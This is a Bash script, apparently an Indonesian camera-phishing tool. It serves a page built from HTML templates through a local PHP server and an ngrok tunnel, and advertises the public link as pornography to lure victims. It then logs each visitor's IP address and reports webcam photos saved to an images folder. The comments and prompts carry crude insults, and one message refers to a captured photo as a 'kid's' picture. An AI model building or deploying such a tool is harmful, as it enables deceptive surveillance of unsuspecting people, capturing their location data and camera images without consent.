#!/bin/bash
#ea.. sianak baik mau recode buat sendirilah asw kentod
#kalau mau recode izin tod lu gx ngerti apa-apa mau recode!
#pelajari dulu bosss..........!!!
#nanti kpan-kpan aku bikin yang multi fungsi
#WhoMHw && Mr.WR.py



hedygans(){
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

    cat ip.txt >> saved.ip.txt


}

recode(){

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] menuggu targets,\e[0m\e[1;77m tekan Ctrl + C to untuk keluar...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened bokep!\n"
hedygans
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] nih gambar bocilnya!\e[0m\e[1;77m (foto kekirim images/)\e[0m\n"
rm -rf Log.log
fi
sleep 0.5

done

}

mhw(){
if [[ ! -d images/ ]]; then
mkdir images
fi
}

wibigans(){
    website_template='hedy.html'
    cat $website_template > index.php
    cat template.html >> index.php
}
ngrok(){
    printf "\e[1;92m[\e[0m+\e[1;92m] Start php server su(Hostpotnya Hidupin su!!) \e[0m\e[1;77m(localhost:3333)\e[0m\e[1;92m...\e[0m\n"
    php -S 0.0.0.0:3333 > /dev/null 2>&1 &
    sleep 2
    printf "\e[1;92m[\e[0m\e[1;77m+\e[1;92m] Start ngrok server su(Hotspot idupin) \e[0m\e[1;77m(http 3333)\e[0m\e[1;92m...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
    sleep 10

    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

    printf "\e[1;92m[\e[0m+\e[1;92m] Share bokep\e[0m\e[1;77mNekopoi\e[0m\e[1;92m link:\e[0m\e[1;77m %s\e[0m\n" $link

}


load(){
    BAR='TiKuS_PeReTaS..!!'   # this is full bar, e.g. 20 chars

for i in {1..20}; do
    echo -ne "\r${BAR:0:$i}" # print $i chars of $BAR from 0 position
    sleep .2                 # wait 100ms between "frames"
done
printf '\n'

}

banner(){
printf "\033[32;1m████████╗██╗██╗  ██╗██╗   ██╗███████╗\033[33;1m ██████╗ ███████╗██████╗ ███████╗████████╗ █████╗ ███████╗"
printf '\n'
printf "\033[32;1m╚══██╔══╝██║██║ ██╔╝██║   ██║██╔════╝\033[33;1m ██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔════╝"
printf '\n'
printf "\033[32;1m   ██║   ██║█████╔╝ ██║   ██║███████╗\033[33;1m ██████╔╝█████╗  ██████╔╝█████╗     ██║   ███████║███████╗"
printf '\n'
printf "\033[32;1m   ██║   ██║██╔═██╗ ██║   ██║╚════██║\033[33;1m ██╔═══╝ ██╔══╝  ██╔══██╗██╔══╝     ██║   ██╔══██║╚════██║"
printf '\n'
printf "\033[32;1m   ██║   ██║██║  ██╗╚██████╔╝███████║\033[33;1m ██║     ███████╗██║  ██║███████╗   ██║   ██║  ██║███████║"
printf '\n'
printf "\033[32;1m   ╚═╝   ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝\033[33;1m ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝ V:0.02"
printf '\n'
printf "\033[31;1m                         .:| Author:\033[37;1mWhoMHw \033[31;1m|:. "
printf '\n'
printf "\033[34;1m                         .:| Telegram:\033[37;1mHedy2\033[34;1m|:.    "
printf '\n'
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mYoutubme:https://www.youtube.com/channel/UChMIkGetnMB4qq9K5kNwkXA/featured"
printf '\n'
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mGithub:https://github.com/WhoMHw"
printf '\n'
sleep 0.07
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mGithub:https://github.com/WongBiasa"
printf '\n'
sleep 0.03
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mInstagram:https://www.instagram.com/wong_biasa0723/"
printf "\n"
sleep 0.03
printf "\033[32;1m[\033[33;1m*\033[32;1m]\033[37;1mInstagram:https://www.instagram.com/siapa_namasaya23/"
printf '\n'

}


pembuka(){
    printf "\033[33;1m press enter untuk lanjut..........!"
    read
    printf "\033[32;1m selamat datang, siapa nama kaka?"
    read nama
    printf "\033[32;1m--=[\033[33;1m+\033[32;1m]\033[37;1mSelamat Datang $nama Jones:V\033[32;1m[\033[33;1m+\033[32;1m]=--"
    printf '\n'
}

pembuka
load
banner
wibigans
mhw
ngrok
recode
hedygans
